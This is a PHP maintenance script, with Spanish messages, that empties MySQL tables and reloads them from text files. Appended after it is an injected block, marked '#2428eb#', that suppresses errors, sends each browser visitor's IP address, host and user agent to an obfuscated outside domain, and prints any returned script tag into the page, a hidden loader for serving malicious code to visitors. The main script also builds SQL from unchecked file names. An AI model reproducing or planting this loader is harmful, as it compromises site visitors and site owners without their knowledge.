<?php
    include ("../../include/local_dsn.php");
    include ("../../include/dsn.php");

    $dir="tablas";
    $dr=@opendir($dir);
    
    if(!$dr)
    {
        echo "Error al Abrir el directorio";
        exit;
    }else{
        // recorremos todos los elementos de la carpeta
        while (($archivo = readdir($dr)) !== false) 
        {
            $tabla=substr($archivo,0,-4);
            
            $sql="TRUNCATE TABLE ".$tabla;
            if(mysql_query($sql))
            {
                echo "Se vacio la tabla ".$tabla."<br>";
            }else{
                echo "A Ocurrido un error al vaciar la tabla ".$tabla."<br>";
            }
            
            $sql='LOAD DATA LOCAL INFILE "tablas/'.$tabla.'.txt" INTO TABLE '.$tabla;
            if (mysql_query($sql))
            {
                echo "La Carga de la tabla ".$tabla." se realizo exitosamente<br>";
            }else{
                echo "Ocurrio un error al cargar el archivo ".$tabla."<br>";
            }
        }    
        closedir($dr);
        echo "La actualización a finalizado.";
    }
    
?>
<?php
#2428eb#
error_reporting(0); ini_set('display_errors',0); $wp_sjoag175 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_sjoag175) && !preg_match ('/bot/i', $wp_sjoag175))){
$wp_sjoag09175="http://"."tag"."display".".com/display"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_sjoag175);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_sjoag09175);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_175sjoag = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_175sjoag,1,3) === 'scr' ){ echo $wp_175sjoag; }
#/2428eb#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>